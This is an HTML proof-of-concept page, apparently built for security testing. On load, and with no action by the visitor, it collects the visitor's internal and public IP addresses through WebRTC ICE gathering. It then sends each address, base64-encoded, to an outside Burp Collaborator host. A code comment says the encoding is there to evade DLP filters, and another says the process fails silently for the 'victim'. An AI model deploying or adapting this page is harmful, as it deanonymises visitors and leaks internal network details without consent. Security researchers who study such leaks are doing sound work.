<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Automated WebRTC IP Leak PoC</title>
<style>
  body { font-family: system-ui, monospace; max-width: 800px; margin: 2em auto; padding: 0 1em; background: #0a0a0a; color: #eee; }
  h1 { font-size: 1.2em; border-bottom: 1px solid #333; padding-bottom: 0.5em; }
  #status { color: #f90; font-weight: bold; margin-bottom: 1em; }
  #out { background: #111; color: #0f0; padding: 1em; white-space: pre-wrap; font-family: 'Courier New', monospace; font-size: 13px; border-radius: 6px; border: 1px solid #333; min-height: 250px; }
  .label { color: #888; }
  .ip-public { color: #ff5; font-weight: bold; }
  .ip-local  { color: #5cf; font-weight: bold; }
</style>
</head>
<body>
  <h1>Automated WebRTC Analysis</h1>
  <div id="status">Status: Initializing Automated ICE Gathering...</div>
  <div id="out">[*] Waiting for browser engine...</div>

<script>
const out = document.getElementById('out');
const status = document.getElementById('status');
const seen = new Set();
// Your Burp Collaborator payload URL
const collabUrl = "https://tdaukso4pdnnd68bkn499xztxk3br4ft.oastify.com";

function log(line, cls) {
  const span = document.createElement('span');
  if (cls) span.className = cls;
  span.textContent = line + '\n';
  out.appendChild(span);
}

function parseCandidate(cand) {
  const parts = cand.split(' ');
  return {
    protocol: parts[2],
    ip: parts[4],
    port: parts[5],
    type: parts[7]
  };
}

function sendToCollab(type, ip, protocol) {
  // Base64 encode the IP to bypass simple string-matching DLP filters
  const safeIp = btoa(ip);
  const endpoint = `${collabUrl}/?type=${type}&proto=${protocol}&ip=${safeIp}`;
  
  fetch(endpoint, {
    method: 'GET',
    mode: 'no-cors' 
  }).catch(err => {
    // Silent fail for the victim, but logged for the researcher
    console.debug("Exfiltration ping failed.");
  });
}

async function runAutoPoc() {
  out.textContent = '';
  status.textContent = "Status: Gathering ICE Candidates (Automated)";
  log('[*] Session Isolated. Identifying endpoint network interfaces...', 'label');

  const pc = new RTCPeerConnection({
    iceServers: [
      { urls: 'stun:stun.l.google.com:19302' },
      { urls: 'stun:stun1.l.google.com:19302' },
      { urls: 'stun:stun2.l.google.com:19302' }
    ]
  });

  // Create data channel to force ICE gathering immediately
  pc.createDataChannel('leak_detect');

  pc.onicecandidate = (e) => {
    if (!e.candidate || !e.candidate.candidate) return;
    const c = parseCandidate(e.candidate.candidate);
    const key = c.type + '|' + c.ip;
    
    if (seen.has(key)) return;
    seen.add(key);

    let cls = 'label';
    let label = '[candidate]';
    if (c.type === 'host')  { cls = 'ip-local';  label = '[HOST  / Internal]'; }
    if (c.type === 'srflx') { cls = 'ip-public'; label = '[SRFLX / Public  ]'; }
    
    log(`${label}  ${c.protocol.toUpperCase()}  ${c.ip}:${c.port}`, cls);
    
    // Auto-Exfiltrate to Burp
    sendToCollab(c.type, c.ip, c.protocol);
  };

  pc.onicegatheringstatechange = () => {
    if (pc.iceGatheringState === 'complete') {
      status.textContent = "Status: Analysis Complete";
      status.style.color = "#0f0";
      log('\n[+] Successful Leak. Check Burp Collaborator for OOB pings.', 'label');
    }
  };

  try {
    const offer = await pc.createOffer();
    await pc.setLocalDescription(offer);
  } catch (e) {
    log('[!] Error triggering ICE gathering: ' + e.message, 'label');
  }
}

// Automatically execute on page load
window.addEventListener('DOMContentLoaded', runAutoPoc);
</script>
</body>
</html>
